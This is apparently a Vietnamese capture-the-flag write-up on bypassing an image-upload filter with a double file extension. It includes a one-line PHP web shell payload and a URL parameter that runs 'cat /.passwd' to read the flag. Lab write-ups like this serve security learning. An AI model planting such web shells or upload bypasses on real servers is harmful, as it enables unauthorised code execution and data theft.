- tiêu đề : File upload - Double extensions = basic challenge ae học file upload đều trải qua
- nội dung : ae cần RCE được server và đọc flag ở /.passwd

- okay lần này có giao diện cho ae test roi 
- vì tiêu đề upload nên mình lao qua thư mục upload thử 
- trong thư mục này người ta cho ae up file ảnh 

![Alt text](<../image/14.1.png>)

- thử up file ảnh lên ( thường mình luôn có sẵn 1 file ảnh nội dung <?php phpinfo(); ?> ) - ae tạo 1 file txt rồi đổi đuôi thành jpg là được 

![Alt text](<../image/14.2.png>)

- tại sao là phpinfo() -> để check xem có thực thi được code như ý mình không - đừng hầm hố quá system() là firewall nó ban cho vỡ alo ấy :> 
- ae bật burpsuite mode lên nhe 
- lúc này mình đổi thử đuôi file như tiêu đề để bypass 

![Alt text](<../image/14.3.png>)

- có vẻ qua cửa thành công 

![Alt text](<../image/14.4.png>)

- mình cũng hơi thắc mắc luồng hoạt động của code vì nếu filter từ chấm cuối tại (.jpg) sao lại thực thi đuôi đầu (.php) đây là mình vào hẳn thư mục xem không hề có include() hay gì cả

- code dưới cho ae mới có thể hiểu hơn ( của mình nha không chắc đúng )

![Alt text](<../image/14.5.png>)

- đoạn khai thác mình để ae làm cho quen tay , hint : ae thay nội dung ảnh thành <?php system($_GET['tmp']);?> -> vào chỗ lưu ảnh -> thêm ? tmp=cat /.passwd vào url  
- NOTE : ae nên hiểu trước khi dùng nhé 

- bài này mình không đoán được cách họ code và thấy hơi xàm ( mình thiếu kiến thức nên thấy thế nhé , mong ae góp ý thêm thanks)

#hackerga2101: 
- bước dùng thử và test rất quan trọng để ae đoán được luồng hoạt động của chương trình 
- làm quen với các câu lệnh hệ thống và sink nguy hiểm trong php như system() , eval() , passsthru() ,...